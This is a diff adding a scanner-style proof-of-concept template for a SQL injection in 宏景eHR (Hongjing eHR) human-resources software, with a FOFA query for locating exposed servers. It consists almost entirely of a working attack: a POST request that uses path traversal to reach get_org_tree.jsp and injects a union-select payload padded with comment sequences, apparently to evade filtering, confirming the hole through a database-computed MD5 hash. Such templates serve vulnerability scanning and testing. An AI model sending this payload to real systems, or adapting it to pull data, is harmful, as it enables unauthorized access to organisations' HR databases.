@@ -1,0 +1,20 @@
+id: poc-yaml-hongjing-ehr-zp-options-sqli
+info:
+  name: 宏景eHR zp_options SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /templates/attestation/../../hire/zp_options/get_org_tree.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: params=1%3c1/***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***//***/union/***//***/select/***//***/1,2,sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')),4--+
+  expression: status_code == 200 && contains(body,"0x" + t2) && contains(body,"</TreeNode>")
+    && contains(content_type,"text/xml")
+transport: http
